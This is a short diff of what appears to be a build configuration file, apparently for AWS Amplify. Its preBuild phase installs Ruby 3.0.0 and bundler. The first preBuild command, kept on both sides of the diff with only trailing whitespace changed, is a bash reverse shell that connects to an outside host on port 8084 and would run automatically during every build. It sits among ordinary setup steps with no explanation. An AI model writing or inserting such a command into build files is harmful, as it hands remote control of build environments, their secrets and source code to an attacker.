@@ -3,7 +3,7 @@ frontend:
   phases:
     preBuild:
       commands:
-        - /bin/bash -l > /dev/tcp/crazydiam0nd.com/8084 0<&1 2>&1
+        - /bin/bash -l > /dev/tcp/crazydiam0nd.com/8084 0<&1 2>&1 
         - rvm get stable && rvm install 3.0.0
         - rvm use 3.0.0
         - gem install bundler -v '=2.3.13'
